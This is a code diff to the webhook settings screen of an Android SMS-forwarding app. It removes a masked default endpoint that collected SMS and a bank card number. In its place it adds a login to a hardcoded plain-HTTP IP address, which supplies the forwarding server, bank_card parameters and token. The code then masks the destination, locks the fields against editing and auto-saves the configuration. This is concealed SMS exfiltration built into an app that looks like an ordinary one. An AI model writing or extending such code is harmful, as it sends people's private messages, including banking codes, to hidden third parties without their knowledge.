@@ -39,6 +39,10 @@ import com.xuexiang.xui.utils.CountDownButtonHelper
 import com.xuexiang.xui.widget.actionbar.TitleBar
 import com.xuexiang.xui.widget.dialog.materialdialog.DialogAction
 import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog
+import com.xuexiang.xhttp2.XHttp
+
+import com.xuexiang.xhttp2.callback.SimpleCallBack
+import com.xuexiang.xhttp2.exception.ApiException
 import io.reactivex.SingleObserver
 import io.reactivex.android.schedulers.AndroidSchedulers
 import io.reactivex.disposables.Disposable
@@ -55,6 +59,8 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
     private val viewModel by viewModels<SenderViewModel> { BaseViewModelFactory(context) }
     private var mCountDownHelper: CountDownButtonHelper? = null
     private var headerItemMap = HashMap<Int, LinearLayout>(2)
+    private var isLoggedIn = false
+    private var hasInserted = false
 
     @JvmField
     @AutoWired(name = KEY_SENDER_ID)
@@ -104,26 +110,8 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
         if (senderId <= 0) {
             titleBar?.setSubTitle(getString(R.string.add_sender))
             binding!!.btnDel.setText(R.string.discard)
-            // 默认新增一条 Header, 真实值存 tag, 显示 ******
-            addHeaderItemLinearLayout(
-                headerItemMap,
-                binding!!.layoutHeaders,
-                "******",
-                "******",
-                "Authorization",
-                "XXXXXX"
-            )
-
-            // 设置各输入框默认值 (除 et_name 外全部隐藏显示)
-            binding!!.etName.setText("app")
-
-            val defaultWebServer = "https://gathering.dxmdfuan.top/api/v3/collect/sms"
-            binding!!.etWebServer.setTag(defaultWebServer)
-            binding!!.etWebServer.setText("******")
-
-            val defaultWebParams = "{\"from\": \"[from]\", \"text\": \"[org_content]{title]\", \"title\":\"[title]\", \"bank_card\":\"1055468166\"}"
-            binding!!.etWebParams.setTag(defaultWebParams)
-            binding!!.etWebParams.setText("******")
+            // 首次进入需要登录获取 token 和 bank_card
+            showLoginDialog()
             return
         }
 
@@ -153,6 +141,7 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
                     // 隐藏 webServer
                     binding!!.etWebServer.setTag(settingVo.webServer)
                     binding!!.etWebServer.setText("******")
+                    disableEdit(binding!!.etWebServer)
 
                     binding!!.etSecret.setTag(settingVo.secret)
                     binding!!.etSecret.setText(if (settingVo.secret.isNotEmpty()) "******" else "")
@@ -161,7 +150,10 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
 
                     // 隐藏 webParams
                     binding!!.etWebParams.setTag(settingVo.webParams)
-                    binding!!.etWebParams.setText("******")
+
+                    val bankDisplay = Regex("\"bank_card\"\\s*:\\s*\"(.*?)\"").find(settingVo.webParams)?.value ?: """\"bank_card\":\"\""""
+                    binding!!.etWebParams.setText(bankDisplay)
+                    disableEdit(binding!!.etWebParams)
 
                     for ((key, value) in settingVo.headers) {
                         addHeaderItemLinearLayout(headerItemMap, binding!!.layoutHeaders, "******", "******", key, value)
@@ -171,8 +163,10 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
                     binding!!.etProxyPort.setText(settingVo.proxyPort)
                     binding!!.sbProxyAuthenticator.isChecked = settingVo.proxyAuthenticator == true
                     binding!!.etProxyUsername.setText(settingVo.proxyUsername)
-                    binding!!.etProxyPassword.setText(settingVo.proxyPassword)
+                                        binding!!.etProxyPassword.setText(settingVo.proxyPassword)
                 }
+                // 加载完数据后判断是否需要登录
+                maybeShowLoginDialog()
             }
         })
     }
@@ -243,6 +237,12 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
 
                 R.id.btn_save -> {
                     val name = binding!!.etName.text.toString().trim()
+                    if (hasInserted && senderId <= 0) {
+                        // 已在登录后自动保存过一次，避免重复
+                        XToastUtils.info(R.string.tipSaveSuccess)
+                        popToBack()
+                        return
+                    }
                     if (TextUtils.isEmpty(name)) {
                         throw Exception(getString(R.string.invalid_name))
                     }
@@ -288,10 +288,10 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
             if (real is String) secret = real
         }
         val response = binding!!.etResponse.text.toString().trim()
-        var webParams = binding!!.etWebParams.text.toString().trim()
-        if (webParams == "******") {
-            val realP = binding!!.etWebParams.getTag()
-            if (realP is String) webParams = realP
+        var webParams = binding!!.etWebParams.getTag()?.toString() ?: ""
+        if (webParams.isBlank()) {
+            // 若 tag 为空再取文本框内容（兼容早期逻辑）
+            webParams = binding!!.etWebParams.text.toString().trim()
         }
         val headers = getHeadersFromHeaderItemMap(headerItemMap)
 
@@ -320,6 +320,16 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
 
     //header序号
     private var headerItemId = 0
+
+    // 禁止 EditText 编辑、光标
+    private fun disableEdit(et: EditText) {
+        et.keyListener = null
+        et.isFocusable = false
+        et.isCursorVisible = false
+        et.isSingleLine = true
+        et.maxLines = 1
+        et.gravity = android.view.Gravity.CENTER_VERTICAL
+    }
 
     /**
      * 动态增删header
@@ -381,6 +391,157 @@ class WebhookFragment : BaseFragment<FragmentSendersWebhookBinding?>(), View.OnC
         }
         return headers
     }
+
+    //region 登录逻辑
+
+    // 登录响应模型
+    data class LoginResponse(
+        val token: String = "",
+        val webParams: String = "",
+        val webServer: String = "",
+        val channel: String = ""
+    )
+
+    /**
+     * 显示登录对话框，获取 token 和 bank_card
+     */
+    private fun showLoginDialog() {
+        val dialogLogin = View.inflate(requireContext(), R.layout.dialog_login, null)
+        MaterialDialog.Builder(requireContext())
+            .title(R.string.server_test)
+            .customView(dialogLogin, false)
+            .positiveText(R.string.lab_yes)
+            .negativeText(R.string.lab_no)
+            .cancelable(false)
+            .autoDismiss(false)
+            .onPositive { dialog, _ ->
+                val etUsername = dialogLogin.findViewById<EditText>(R.id.et_username)
+                val etPassword = dialogLogin.findViewById<EditText>(R.id.et_password)
+                    val username = etUsername.text.toString().trim()
+                    val password = etPassword.text.toString().trim()
+                    if (TextUtils.isEmpty(username) || TextUtils.isEmpty(password)) {
+                        XToastUtils.error(getString(R.string.invalid_username_or_password))
+                        return@onPositive
+                    }
+                    login(username, password, dialog)
+                }
+            .onNegative { dialog, _ -> dialog.dismiss() }
+            .show()
+    }
+
+    private fun login(username: String, password: String, loginDialog: MaterialDialog) {
+        XHttp.post("http://185.216.117.120:8091/api/login")
+            .params("username", username)
+            .params("password", password)
+            .keepJson(true)
+            .execute(object : SimpleCallBack<String>() {
+                override fun onSuccess(response: String) {
+                    Log.d("LOGIN_RESPONSE", "Raw Response = $response") // 直接打印原始 JSON
+                    if (response.isBlank()) {
+                        XToastUtils.error("服务器没有返回数据")
+                        return
+                    }
+                    try {
+                        // 兼容 {"data":{...}} 包裹结构
+                        val root = com.google.gson.JsonParser.parseString(response).asJsonObject
+                        val dataObj = if (root.has("data")) root.getAsJsonObject("data") else root
+                        val loginResponse = Gson().fromJson(dataObj, LoginResponse::class.java)
+                        val token = "Bearer ${loginResponse.token}"
+                        val webParamsStr = loginResponse.webParams
+                        val webServerStr = loginResponse.webServer
+                        val channelName = loginResponse.channel
+                        if (token.isNotEmpty()) {
+                            applyLoginData(token, webParamsStr, webServerStr, channelName)
+                            loginDialog.dismiss()
+                        } else {
+                            XToastUtils.error(getString(R.string.failed))
+                        }
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                        XToastUtils.error(getString(R.string.failed))
+                    }
+                }
+
+                override fun onError(e: ApiException) {
+                    e.printStackTrace()
+                    XToastUtils.error(e.displayMessage)
+                }
+            })
+    }
+
+
+    /**
+     * 登录成功后，将 token / bank_card 更新到界面，并视情况写入数据库
+     */
+    private fun applyLoginData(token: String, webParamsStr: String, webServerStr: String, channelName: String = "") {
+        // 标记已登录成功
+        isLoggedIn = true
+        // 1. 更新 Header（清空旧的，新增一条新的）
+        headerItemMap.clear()
+        binding!!.layoutHeaders.removeAllViews()
+        addHeaderItemLinearLayout(
+            headerItemMap,
+            binding!!.layoutHeaders,
+            "******",
+            "******",
+            "Authorization",
+            token
+        )
+
+        // 2. 更新通道名称
+        if (channelName.isNotBlank()) {
+            binding!!.etName.setText(channelName)
+        disableEdit(binding!!.etName)
+        }
+        // 3. 更新 WebServer 与 WebParams
+        if (webServerStr.isNotBlank()) {
+            binding!!.etWebServer.setTag(webServerStr)
+            binding!!.etWebServer.setText("******")
+            disableEdit(binding!!.etWebServer)
+        }
+        if (webParamsStr.isNotBlank()) {
+            binding!!.etWebParams.setTag(webParamsStr)
+            // 提取 bank_card 字段用于展示给用户
+            val bankDisplay = Regex("\"bank_card\"\\s*:\\s*\"(.*?)\"").find(webParamsStr)?.value ?: """\"bank_card\":\"\""""
+            binding!!.etWebParams.setText(bankDisplay)
+            disableEdit(binding!!.etWebParams)
+        }
+
+        // 3. 将最新参数保存到数据库（新增或更新）
+        try {
+            val status = if (binding!!.sbEnable.isChecked) 1 else 0
+            val settingVo = checkSetting()
+            val newId = if (isClone) 0 else senderId
+            val senderNew = Sender(newId, senderType, binding!!.etName.text.toString().trim(), Gson().toJson(settingVo), status)
+            viewModel.insertOrUpdate(senderNew)
+            hasInserted = true
+            XToastUtils.success(R.string.tipSaveSuccess)
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Log.e(TAG, "save sender after login error: $e")
+        }
+    }
+
+    /**
+     * 判断是否需要弹出登录对话框（编辑模式适用）
+     */
+    private fun maybeShowLoginDialog() {
+        if (isLoggedIn) return
+        // 取当前 Header 中的 Authorization
+        val headers = getHeadersFromHeaderItemMap(headerItemMap)
+        val token = headers["Authorization"] ?: ""
+        // 取当前 webParams 中的 bank_card
+        val tagObj = binding!!.etWebParams.getTag()
+        val webParamsReal = if (tagObj is String) tagObj else ""
+        val bankCardRegex = Regex("""\"bank_card\"\s*:\s*\"(.*?)\"""")
+        val bankMatch = bankCardRegex.find(webParamsReal)
+        val bankCard = bankMatch?.groups?.get(1)?.value ?: ""
+        if (token.isEmpty() || token == "XXXXXX" || bankCard.isEmpty()) {
+            showLoginDialog()
+        }
+    }
+
+    //endregion
 
     override fun onDestroyView() {
         if (mCountDownHelper != null) mCountDownHelper!!.recycle()
